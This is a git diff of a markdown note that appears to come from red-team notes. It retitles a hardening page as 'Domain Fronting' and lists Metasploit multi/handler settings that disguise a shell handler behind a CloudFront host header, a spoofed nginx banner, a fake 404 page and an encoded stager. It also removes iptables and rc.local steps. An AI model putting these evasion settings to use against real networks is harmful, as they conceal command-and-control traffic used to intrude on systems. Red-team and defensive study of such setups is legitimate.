@@ -1,24 +1,20 @@
-# Hardening
+# Domain Fronting
 
-Search Tag(s): #red-team-infrastructure #metasploit
+Search Tag(s): #red-team-infrastructure #metasploit-framework #domain-fronting
 
-## 01 - Setup
-
-### 1.1 - Shell Handler
-
-#### 1.1.1 - Domain Fronting
+## 01 - Shell Handler
 
 ```
 msf exploit(multi/handler) > set HttpHostHeader afsa0dfna0sdfhq3.cloudfront.net
 
-msf exploit(multi/handler) > set HttpUserAgent <User Agent>
+msf exploit(multi/handler) > set HttpUserAgent <user_agent>
 
 msf exploit(multi/handler) > set HttpServerName nginx/1.21.2
 
 msf exploit(multi/handler) > set HttpUnknownRequestResponse <html><head><title>404 Not Found</title></head><body><p><h1 align="center">404 Not Found</h1></p><br><p><hr></p><p align="center">nginx/1.21.2</p></body></html>
 ```
 
-#### 1.1.2 - The URI length for the stager (at least 5 bytes)
+## 02 - The URI length for the stager (at least 5 bytes)
 
 ```
 msf exploit(multi/handler) > set StagerURILength 420
@@ -40,44 +36,6 @@ msf exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
 msf exploit(multi/handler) > set HttpHostHeader
 
 msf exploit(multi/handler) > set HttpCookie
-```
-
-### 1.2 - Firewall Rules
-
-```
-# mkdir /etc/iptables
-# iptables -I INPUT 1 -p tcp -s 0.0.0.0/0 --dport 5432 -j DROP
-# iptables -I INPUT 1 -p tcp -s 127.0.0.1 --dport 5432 -j ACCEPT
-# iptables-save > /etc/iptables/rules.v4
-```
-
-- A script to autorun after reboot. Run this as root (without `sudo`)
-
-```bash
-cat << EOF > /etc/rc.local
-#!/bin/sh -e
-#
-# rc.local
-#
-# This script is executed at the end of each multiuser runlevel.
-# Make sure that the script will "exit 0" on success or any other
-# value on error.
-#
-# In order to enable or disable this script just change the execution
-# bits.
-#
-# By default this script does nothing.
-
-sudo iptables-restore < /etc/iptables/rules.v4
-
-exit 0
-EOF
-```
-
-```
-$ sudo chmod 755 /etc/rc.local
-
-$ sudo systemctl start rc-local
 ```
 
 ---
